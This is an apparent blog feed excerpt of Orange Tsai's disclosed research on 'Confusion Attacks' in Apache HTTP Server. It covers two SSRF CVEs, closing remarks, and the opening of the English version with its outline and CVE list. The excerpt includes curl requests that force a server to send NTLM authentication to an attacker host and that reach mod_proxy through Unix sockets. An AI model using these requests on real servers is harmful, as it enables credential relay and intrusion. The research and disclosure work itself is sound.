&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h3 id=&quot;-4-其它漏洞&quot;&gt;🔥 4. 其它漏洞&lt;/h3&gt;

&lt;p&gt;基本上整個 Confusion Attacks 系列到這邊差不多告一個段落，然而在研究 Apache HTTP Server 的過程中還有些值得一提的漏洞因此將它們獨立出來。&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h4 id=&quot;️-cve-2024-38472---基於-windows-unc-的-ssrf&quot;&gt;⚔️ CVE-2024-38472 - 基於 Windows UNC 的 SSRF&lt;/h4&gt;

&lt;p&gt;首先是 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;apr_filepath_merge()&lt;/code&gt; 函數在 Windows 的實作允許使用 UNC 路徑，下面提供兩種不同的觸發路徑讓攻擊者可以向任意主機發起 NTLM 認證：&lt;/p&gt;

&lt;h5 id=&quot;️-透過-http-請求解析器觸發&quot;&gt;✔️ 透過 HTTP 請求解析器觸發&lt;/h5&gt;

&lt;p&gt;想要直接透過 HTTP 請求觸發需要在 Httpd 中設置額外的設定，雖然這個設定第一眼看起來有點不現實，但似乎經常與 Tomcat (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mod_jk&lt;/code&gt;、&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mod_proxy_ajp&lt;/code&gt;) 或是與 &lt;a href=&quot;https://httpd.apache.org/docs/2.4/en/mod/core.html#allowencodedslashes&quot;&gt;PATH_INFO&lt;/a&gt; 一起出現：&lt;/p&gt;

&lt;div class=&quot;language-apache highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nc&quot;&gt;AllowEncodedSlashes&lt;/span&gt; &lt;span class=&quot;ss&quot;&gt;On&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;另外由於 Httpd 在 2.4.49 後重寫了核心 HTTP 請求解析器邏輯，要在大於此版本的 Httpd 上觸發漏洞需要再額外加上一個設定：&lt;/p&gt;

&lt;div class=&quot;language-apache highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nc&quot;&gt;AllowEncodedSlashes&lt;/span&gt; &lt;span class=&quot;ss&quot;&gt;On&lt;/span&gt;
MergeSlashes &lt;span class=&quot;ss&quot;&gt;Off&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;透過兩個 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;%5C&lt;/code&gt; 可以使強迫 Httpd 向 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;attacker-server&lt;/code&gt; 發起 NTLM 認證，實務上也可透過 &lt;a href=&quot;https://en.hackndo.com/ntlm-relay/&quot;&gt;NTLM Relay&lt;/a&gt; 的方式將此 SSRF 轉化成 RCE！&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;curl http://server/%5C%5Cattacker-server/path/to
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240809/11.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h5 id=&quot;️-透過-type-map-觸發&quot;&gt;✔️ 透過 Type-Map 觸發&lt;/h5&gt;

&lt;p&gt;&lt;a href=&quot;https://sources.debian.org/src/apache2/2.4.62-1/debian/config-dir/mods-available/mime.conf/#L235&quot;&gt;Debian/Ubuntu 的 Httpd 發行版&lt;/a&gt;中預設啟用了 Type-Map：&lt;/p&gt;

&lt;div class=&quot;language-apache highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nc&quot;&gt;AddHandler&lt;/span&gt; type-map &lt;span class=&quot;ss&quot;&gt;var&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;透過上傳一個 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.var&lt;/code&gt; 檔案到伺服器，將其中 URI 欄位指定成 UNC 路徑也可強迫伺服器向攻擊者發起 NTLM 認證，這也是我所提出的&lt;a href=&quot;https://github.com/orangetw/My-CTF-Web-Challenges?tab=readme-ov-file#ostyle&quot;&gt;第二個 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.var&lt;/code&gt; 小技巧&lt;/a&gt; 😉&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h4 id=&quot;️-cve-2024-39573---基於-rewriterule-前綴可完全控制的-ssrf&quot;&gt;⚔️ CVE-2024-39573 - 基於 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;RewriteRule&lt;/code&gt; 前綴可完全控制的 SSRF&lt;/h4&gt;

&lt;p&gt;最後則是當位於 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Server Config&lt;/code&gt; 或是 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;VirtualHost&lt;/code&gt; 中的 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;RewriteRule&lt;/code&gt; 前綴完全可控時，可以呼叫到 Proxy 以及相關子模組：&lt;/p&gt;

&lt;div class=&quot;language-apache highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nc&quot;&gt;RewriteRule&lt;/span&gt; ^/broken(.*) $1
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;透過下列網址可將請求轉交給 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mod_proxy&lt;/code&gt; 處理：&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;curl http://server/brokenproxy:unix:/run/[...]|http://path/to
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;但如果網管有好好測試，就會發現這樣子的規則是不實際的，所以原本只把它當成另外一個漏洞的搭配組合一起回報，沒想到這個行為也被當成一個安全邊界修復。 再隨著修補出來後也看到其他研究員把同樣行為套用在 Windows UNC 上獲得另外一個額外的 CVE。&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;未來研究方向&quot;&gt;未來研究方向&lt;/h2&gt;

&lt;p&gt;最後是關於這份研究的未來的一些展望以及可加強的地方，基本上 Confusion Attacks 仍然是一個很有潛力的攻擊面，尤其是我這次的研究主要也只專注在兩個欄位上而已，只要 Apache HTTP Server 沒有好好從底層進行結構性加強或提供給開發者一個好的開發標準，相信未來還會有更多「混淆」出現！&lt;/p&gt;

&lt;p&gt;至於還有哪些方面可以加強呢？ 其實不同的 Httpd 發行版會有不同的設定檔案，因此其它的 Unix-Like 系統例如 RHEL 家族、BSD 系列，甚至使用到 Httpd 的套裝軟體，它們都有機會出現更多可跳脫的重寫規則、更多厲害的 Local Gadgets 甚至意料外的符號跳躍等等 ，就交給有興趣的人繼續吧。&lt;/p&gt;

&lt;p&gt;最後由於時程因素，來不及分享更多在實際網站、設備，甚至開源專案上發現並利用的真實案例，不過你應該已經可以想像 —— 在真實世界中絕對還藏著千千萬萬個比想像中還要大量未開採的規則、可繞過的認證，以及隱藏在檯面下的 CGI，至於如何把這篇裡面所講到的技巧實際應用在全世界上？ 接下來就是你們的任務了！&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;結語&quot;&gt;結語&lt;/h2&gt;

&lt;p&gt;維護一個 Open Source 專案真的是一件很困難的事，尤其在讓使用者方便的同時兼顧舊版本的相容性，稍有不慎可能就會造成整個系統被攻破 (例如 Httpd 2.4.49 中因為一個路徑處理邏輯小改動導致災難性的 &lt;a href=&quot;https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-41773&quot;&gt;CVE-2021-41773&lt;/a&gt;)，整個開發過程必須要小心翼翼的踩在一堆遺留程式碼以及技術債上。 所以如果真的有 Apache HTTP Server 的開發者看到這篇文我想說： 謝謝你們的貢獻！&lt;/p&gt;
</description>
                <link>https://devco.re/blog/2024/08/09/confusion-attacks-exploiting-hidden-semantic-ambiguity-in-apache-http-server/</link>
                <guid>https://devco.re/blog/2024/08/09/confusion-attacks-exploiting-hidden-semantic-ambiguity-in-apache-http-server</guid>
                <pubDate>Fri, 09 Aug 2024 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>Confusion Attacks: Exploiting Hidden Semantic Ambiguity in Apache HTTP Server!</title>
                <description>&lt;h6 id=&quot;orange-tsai-orange_8361--繁體中文版本--english-version&quot;&gt;Orange Tsai (&lt;a href=&quot;https://x.com/orange_8361&quot;&gt;@orange_8361&lt;/a&gt;)  |  &lt;a href=&quot;/blog/2024/08/09/confusion-attacks-exploiting-hidden-semantic-ambiguity-in-apache-http-server/&quot;&gt;繁體中文版本&lt;/a&gt;  |  &lt;a href=&quot;/blog/2024/08/09/confusion-attacks-exploiting-hidden-semantic-ambiguity-in-apache-http-server-en/&quot;&gt;English Version&lt;/a&gt;&lt;/h6&gt;

&lt;style&gt;
    .language-plaintext {
        background-color: #f9f2f4;
    }

    .highlight {
        border-left: 2px solid #44D62C !important;
    }
&lt;/style&gt;

&lt;p&gt;Hey there! This is my research on Apache HTTP Server presented at &lt;a href=&quot;https://www.blackhat.com/us-24/briefings/schedule/index.html#confusion-attacks-exploiting-hidden-semantic-ambiguity-in-apache-http-server-pre-recorded-40227&quot;&gt;Black Hat USA 2024&lt;/a&gt;. Additionally, this research will also be presented at &lt;a href=&quot;https://hitcon.org/2024/CMT/agenda/eff94e55-3f1d-4229-a65a-65ade9524421/&quot;&gt;HITCON&lt;/a&gt; and &lt;a href=&quot;https://orangecon.nl/&quot;&gt;OrangeCon&lt;/a&gt;. If you’re interested in getting a preview, you can check the slides here:&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;&lt;a href=&quot;https://i.blackhat.com/BH-US-24/Presentations/US24-Orange-Confusion-Attacks-Exploiting-Hidden-Semantic-Thursday.pdf&quot;&gt;Confusion Attacks: Exploiting Hidden Semantic Ambiguity in Apache HTTP Server!&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Also, I would like to thank Akamai for their friendly outreach! They released mitigation measures immediately after this research was published (details can be found on &lt;a href=&quot;https://www.akamai.com/blog/security-research/2024-august-apache-waf-proactive-collaboration-orange-tsai-devcore&quot;&gt;Akamai’s blog&lt;/a&gt;).&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;tldr&quot;&gt;TL;DR&lt;/h2&gt;

&lt;p&gt;This article explores architectural issues within the Apache HTTP Server, highlighting several technical debts within Httpd, &lt;strong&gt;including 3 types of Confusion Attacks, 9 new vulnerabilities, 20 exploitation techniques, and over 30 case studies&lt;/strong&gt;. The content includes, but is not limited to:&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;How a single &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;?&lt;/code&gt; can bypass Httpd’s built-in access control and authentication.&lt;/li&gt;
  &lt;li&gt;How unsafe &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;RewriteRules&lt;/code&gt; can escape the Web Root and access the entire filesystem.&lt;/li&gt;
  &lt;li&gt;How to leverage a piece of code from 1996 to transform an XSS into RCE.&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;outline&quot;&gt;Outline&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;#before-the-story&quot;&gt;Before the Story&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#how-did-the-story-begin&quot;&gt;How Did the Story Begin?&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#why-apache-http-server-smells-bad&quot;&gt;Why Apache HTTP Server Smells Bad?&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#a-whole-new-attack--confusion-attack&quot;&gt;A Whole New Attack — Confusion Attack&lt;/a&gt;
    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#-1-filename-confusion&quot;&gt;1. Filename Confusion&lt;/a&gt;
        &lt;ul&gt;
          &lt;li&gt;&lt;a href=&quot;#%ef%b8%8f-primitive-1-1-truncation&quot;&gt;Primitive 1-1. Truncation&lt;/a&gt;
            &lt;ul&gt;
              &lt;li&gt;&lt;a href=&quot;#%ef%b8%8f-1-1-1-path-truncation&quot;&gt;1-1-1. Path Truncation&lt;/a&gt;&lt;/li&gt;
              &lt;li&gt;&lt;a href=&quot;#%ef%b8%8f-1-1-2-mislead-rewriteflag-assignment&quot;&gt;1-1-2. Mislead RewriteFlag Assignment&lt;/a&gt;&lt;/li&gt;
            &lt;/ul&gt;
          &lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#%ef%b8%8f-primitive-1-2-acl-bypass&quot;&gt;Primitive 1-2. ACL Bypass&lt;/a&gt;&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#-2-documentroot-confusion&quot;&gt;2. DocumentRoot Confusion&lt;/a&gt;
        &lt;ul&gt;
          &lt;li&gt;&lt;a href=&quot;#%ef%b8%8f-primitive-2-1-server-side-source-code-disclosure&quot;&gt;Primitive 2-1. Server-Side Source Code Disclosure&lt;/a&gt;
            &lt;ul&gt;
              &lt;li&gt;&lt;a href=&quot;#%ef%b8%8f-2-1-1-disclose-cgi-source-code&quot;&gt;2-1-1. Disclose CGI Source Code&lt;/a&gt;&lt;/li&gt;
              &lt;li&gt;&lt;a href=&quot;#%ef%b8%8f-2-1-2-disclose-php-source-code&quot;&gt;2-1-2. Disclose PHP Source Code&lt;/a&gt;&lt;/li&gt;
            &lt;/ul&gt;
          &lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#%ef%b8%8f-primitive-2-2-local-gadgets-manipulation&quot;&gt;Primitive 2-2. Local Gadgets Manipulation!&lt;/a&gt;
            &lt;ul&gt;
              &lt;li&gt;&lt;a href=&quot;#%ef%b8%8f-2-2-1-local-gadget-to-information-disclosure&quot;&gt;2-2-1. Local Gadget to Information Disclosure&lt;/a&gt;&lt;/li&gt;
              &lt;li&gt;&lt;a href=&quot;#%ef%b8%8f-2-2-2-local-gadget-to-xss&quot;&gt;2-2-2. Local Gadget to XSS&lt;/a&gt;&lt;/li&gt;
              &lt;li&gt;&lt;a href=&quot;#%ef%b8%8f-2-2-3-local-gadget-to-lfi&quot;&gt;2-2-3. Local Gadget to LFI&lt;/a&gt;&lt;/li&gt;
              &lt;li&gt;&lt;a href=&quot;#%ef%b8%8f-2-2-4-local-gadget-to-ssrf&quot;&gt;2-2-4. Local Gadget to SSRF&lt;/a&gt;&lt;/li&gt;
              &lt;li&gt;&lt;a href=&quot;#%ef%b8%8f-2-2-5-local-gadget-to-rce&quot;&gt;2-2-5. Local Gadget to RCE&lt;/a&gt;&lt;/li&gt;
            &lt;/ul&gt;
          &lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#%ef%b8%8f-primitive-2-3-jailbreak-from-local-gadgets&quot;&gt;Primitive 2-3. Jailbreak from Local Gadgets&lt;/a&gt;
            &lt;ul&gt;
              &lt;li&gt;&lt;a href=&quot;#%ef%b8%8f-2-3-1-jailbreak-from-local-gadgets&quot;&gt;2-3-1. Jailbreak from Local Gadgets&lt;/a&gt;&lt;/li&gt;
              &lt;li&gt;&lt;a href=&quot;#%ef%b8%8f-2-3-2-jailbreak-local-gadgets-to-redmine-rce&quot;&gt;2-3-2. Jailbreak Local Gadgets to Redmine RCE&lt;/a&gt;&lt;/li&gt;
            &lt;/ul&gt;
          &lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#-3-handler-confusion&quot;&gt;3. Handler Confusion&lt;/a&gt;
        &lt;ul&gt;
          &lt;li&gt;&lt;a href=&quot;#%ef%b8%8f-primitive-3-1-overwrite-the-handler&quot;&gt;Primitive 3-1. Overwrite the Handler&lt;/a&gt;
            &lt;ul&gt;
              &lt;li&gt;&lt;a href=&quot;#%ef%b8%8f-3-1-1-overwrite-handler-to-disclose-php-source-code&quot;&gt;3-1-1. Overwrite Handler to Disclose PHP Source Code&lt;/a&gt;&lt;/li&gt;
              &lt;li&gt;&lt;a href=&quot;#%ef%b8%8f-3-1-2-overwrite-handler-to---&quot;&gt;3-1-2. Overwrite Handler to ██████ ███████ ██████&lt;/a&gt;&lt;/li&gt;
            &lt;/ul&gt;
          &lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#%ef%b8%8f-primitive-3-2-invoke-arbitrary-handlers&quot;&gt;Primitive 3-2. Invoke Arbitrary Handlers&lt;/a&gt;
            &lt;ul&gt;
              &lt;li&gt;&lt;a href=&quot;#%ef%b8%8f-3-2-1-arbitrary-handler-to-information-disclosure&quot;&gt;3-2-1. Arbitrary Handler to Information Disclosure&lt;/a&gt;&lt;/li&gt;
              &lt;li&gt;&lt;a href=&quot;#%ef%b8%8f-3-2-2-arbitrary-handler-to-misinterpret-scripts&quot;&gt;3-2-2. Arbitrary Handler to Misinterpret Scripts&lt;/a&gt;&lt;/li&gt;
              &lt;li&gt;&lt;a href=&quot;#%ef%b8%8f-3-2-2-arbitrary-handler-to-full-ssrf&quot;&gt;3-2-2. Arbitrary Handler to Full SSRF&lt;/a&gt;&lt;/li&gt;
              &lt;li&gt;&lt;a href=&quot;#%ef%b8%8f-3-2-3-arbitrary-handler-to-access-local-unix-domain-socket&quot;&gt;3-2-3. Arbitrary Handler to Access Local Unix Domain Socket&lt;/a&gt;&lt;/li&gt;
              &lt;li&gt;&lt;a href=&quot;#%ef%b8%8f-3-2-4-arbitrary-handler-to-rce&quot;&gt;3-2-4. Arbitrary Handler to RCE&lt;/a&gt;&lt;/li&gt;
            &lt;/ul&gt;
          &lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#-4-other-vulnerabilities&quot;&gt;4. Other Vulnerabilities&lt;/a&gt;
        &lt;ul&gt;
          &lt;li&gt;&lt;a href=&quot;#%ef%b8%8f-cve-2024-38472---windows-unc-based-ssrf&quot;&gt;CVE-2024-38472 - Windows UNC-based SSRF&lt;/a&gt;
            &lt;ul&gt;
              &lt;li&gt;&lt;a href=&quot;#%ef%b8%8f-triggered-via-http-request-parser&quot;&gt;Triggered via HTTP Request Parser&lt;/a&gt;&lt;/li&gt;
              &lt;li&gt;&lt;a href=&quot;#%ef%b8%8f-triggered-via-type-map&quot;&gt;Triggered via Type-Map&lt;/a&gt;&lt;/li&gt;
            &lt;/ul&gt;
          &lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#%ef%b8%8f-cve-2024-39573---ssrf-via-full-control-of-rewriterule-prefix&quot;&gt;CVE-2024-39573 - SSRF via Full Control of RewriteRule Prefix&lt;/a&gt;&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#future-works&quot;&gt;Future Works&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#conclusion&quot;&gt;Conclusion&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;before-the-story&quot;&gt;Before the Story&lt;/h2&gt;

&lt;p&gt;This section is just some personal murmurs. If you’re only interested in the technical details, jump straight to — &lt;a href=&quot;#how-did-the-story-begin&quot;&gt;How Did the Story Begin?&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;As a researcher, perhaps the greatest joy is seeing your work recognized and understood by peers. Therefore, after completing a significant research with fruitful results, it is natural to want the world to see it — which is why I’ve presented multiple times at Black Hat USA and DEFCON. As you might know, since 2022, I have been unable to obtain a valid travel authorization to enter the U.S. (For Taiwan, travel authorization under the &lt;a href=&quot;https://esta.cbp.dhs.gov/&quot;&gt;Visa Waiver Program&lt;/a&gt; can typically be obtained online within minutes to hours), leading me to miss the in-person talk at &lt;a href=&quot;https://www.blackhat.com/us-22/briefings/schedule/index.html#lets-dance-in-the-cache---destabilizing-hash-table-on-microsoft-iis-27199&quot;&gt;Black Hat USA 2022&lt;/a&gt;. Even a solo trip to Machu Picchu and Easter Island in 2023 couldn’t transit through the U.S. :(&lt;/p&gt;

&lt;p&gt;To address this situation, I started preparing for a B1/B2 visa in January this year, writing various documents, interviewing at the embassy, and endlessly waiting. It’s not fun. But to have my work seen, I still spent a lot of time seeking all possibilities, even until three weeks before the conference, it was unclear whether my talk would be canceled or not (BH only accepted in-person talks, but thanks to the RB, it could ultimately be presented in pre-recorded format). So, everything you see, including slides, videos, and this blog, was completed within just a few dozen days. 😖&lt;/p&gt;

&lt;p&gt;As a pure researcher with a clear conscience, my attitude towards vulnerabilities has always been — they should be directly reported to and fixed by the vendor. Writing these words isn’t for any particular reason, just to record some feelings of helplessness, efforts in this year, and to thank those who have helped me this year, thank you all :)&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;how-did-the-story-begin&quot;&gt;How Did the Story Begin?&lt;/h2&gt;

&lt;p&gt;Around the beginning of this year, I started thinking about my next research target. As you might know, I always aim to challenge big targets that can impact the entire internet, so I began searching for some complex topics or interesting open-source projects like Nginx, PHP, or even delved into RFCs to strengthen my understanding of protocol details.&lt;/p&gt;

&lt;p&gt;While most attempts ended in failure (though a few might become topics for next blog posts 😉), reading these codes reminded me of a quick review I had done of Apache HTTP Server last year! Although I didn’t dive deep into the code due to the work schedule, I had already “smelled” something not quite right about its coding style at that time.&lt;/p&gt;

&lt;p&gt;So this year, I decided to continue on that research, transforming the “bad smells” from an indescribable “feeling” into concrete research on Apache HTTP Server!&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;why-apache-http-server-smells-bad&quot;&gt;Why Apache HTTP Server Smells Bad?&lt;/h2&gt;

&lt;p&gt;Firstly, the Apache HTTP Server is a world constructed by “modules,” as proudly declared in its &lt;a href=&quot;https://httpd.apache.org/docs/2.4/mpm.html&quot;&gt;official documentation&lt;/a&gt; regarding its modularity:&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;Apache httpd has always accommodated a wide variety of environments through its modular design. […] Apache HTTP Server 2.0 extends this modular design to the most basic functions of a web server.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;The entire Httpd service relies on hundreds of small modules working together to handle a client’s HTTP request. &lt;strong&gt;Among the &lt;a href=&quot;https://httpd.apache.org/docs/2.4/mod/&quot;&gt;136 modules listed by the official documentation&lt;/a&gt;, about half are either enabled by default or frequently used by websites&lt;/strong&gt;!&lt;/p&gt;

&lt;p&gt;What’s even more surprising is that these modules also maintain a colossal &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;request_rec&lt;/code&gt; structure while processing client HTTP requests. This structure includes all the elements involved in handling HTTP, with its detailed definition available in &lt;a href=&quot;https://github.com/apache/httpd/blob/2.4.58/include/httpd.h#L838&quot;&gt;include/httpd.h&lt;/a&gt;. All modules depend on this massive structure for synchronization, communication, and data exchange. As an HTTP request passes through several phases, modules act like players in a game of catch, passing the structure from one to another. Each module even has the ability to modify any value in this structure according to its own preferences!&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240809/1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;This type of collaboration is not new from a software engineering perspective. Each module simply focuses on its own task. As long as everyone finishes their work, then the client can enjoy the service provided by Httpd. This approach might work well with a few modules, &lt;strong&gt;but what happens when we scale it up to hundreds of modules collaborating — can they really work  well together?&lt;/strong&gt; 🤔&lt;/p&gt;

&lt;p&gt;Our starting point is straightforward — &lt;strong&gt;the modules do not fully understand each other, yet they are required to cooperate&lt;/strong&gt;. Each module might be implemented by different people, with the code undergoing years of iterations, refactors, and modifications. Do they really still know what they are doing? Even if they understand their own duty, what about other modules’ implementation details? Without any good development standards or guidelines, there must be several gaps that we can exploit!&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;a-whole-new-attack--confusion-attack&quot;&gt;A Whole New Attack — Confusion Attack&lt;/h2&gt;

&lt;p&gt;Based on these observations, we started &lt;strong&gt;focusing on the “relationships” and “interactions” among these modules&lt;/strong&gt;. If a module accidentally modifies a structure field that it considers unimportant, but is crucial for another module, it could affect the latter’s decisions. Furthermore, if the definitions or semantics of the fields are not precise enough, causing ambiguities in how modules understand the same fields, it could lead to potential security risks as well!&lt;/p&gt;

&lt;p&gt;From this starting point, we developed three different types of attacks, as these attacks are more or less related to the misuse of structure fields. Hence, we’ve named this attack surface “Confusion Attack,” and the following are the attacks we developed:&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;&lt;strong&gt;Filename Confusion&lt;/strong&gt;&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;DocumentRoot Confusion&lt;/strong&gt;&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;Handler Confusion&lt;/strong&gt;&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;Through these attacks, we have identified 9 different vulnerabilities:&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;&lt;strong&gt;CVE-2024-38472&lt;/strong&gt; - Apache HTTP Server on Windows UNC SSRF&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;CVE-2024-39573&lt;/strong&gt; - Apache HTTP Server proxy encoding problem&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;CVE-2024-38477&lt;/strong&gt; - Apache HTTP Server: Crash resulting in Denial of Service in mod_proxy via a malicious request&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;CVE-2024-38476&lt;/strong&gt; - Apache HTTP Server may use exploitable/malicious backend application output to run local handlers via internal redirect&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;CVE-2024-38475&lt;/strong&gt; - Apache HTTP Server weakness in mod_rewrite when first segment of substitution matches filesystem path&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;CVE-2024-38474&lt;/strong&gt; - Apache HTTP Server weakness with encoded question marks in backreferences&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;CVE-2024-38473&lt;/strong&gt; - Apache HTTP Server proxy encoding problem&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;CVE-2023-38709&lt;/strong&gt; - Apache HTTP Server: HTTP response splitting&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;CVE-2024-??????&lt;/strong&gt; - [redacted]&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;These vulnerabilities were reported through the official security mailing list and were addressed by the Apache HTTP Server in the &lt;a href=&quot;https://httpd.apache.org/security/vulnerabilities_24.html&quot;&gt;2.4.60 update&lt;/a&gt; published on 2024-07-01.&lt;/p&gt;

&lt;p&gt;As this is a new attack surface from Httpd’s architectural design and its internal mechanisms, naturally, &lt;del&gt;the first person to delve into it can find the most vulnerabilities. Thus, I currently hold the most CVEs from Apache HTTP Server 😉.&lt;/del&gt; it leads to many updates that are not backward compatible. Therefore, patching these issues is not easy for many long-running production servers. If administrators update without careful consideration, they might disrupt existing configurations, causing service downtime. 😨&lt;/p&gt;

&lt;p&gt;Now, it’s time to get started with our Confusion Attacks! Are you ready?&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h3 id=&quot;-1-filename-confusion&quot;&gt;🔥 1. Filename Confusion&lt;/h3&gt;

&lt;p&gt;The first issue stems from confusion regarding the filename field. Literally, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;r-&amp;gt;filename&lt;/code&gt; should represent a filesystem path. However, in Apache HTTP Server, some modules treat it as a URL. If, within an HTTP context, most modules consider &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;r-&amp;gt;filename&lt;/code&gt; as a filesystem path but some others treat it as a URL, this inconsistency can lead to security issues!&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h4 id=&quot;️-primitive-1-1-truncation&quot;&gt;⚔️ Primitive 1-1. Truncation&lt;/h4&gt;

&lt;p&gt;So, which modules treat &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;r-&amp;gt;filename&lt;/code&gt; as a URL? The first is &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mod_rewrite&lt;/code&gt;, which allows sysadmins to easily rewrite a path pattern to a specified substitution target using the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;RewriteRule&lt;/code&gt; directive:&lt;/p&gt;

&lt;div class=&quot;language-apache highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nc&quot;&gt;RewriteRule&lt;/span&gt; Pattern Substitution [flags]
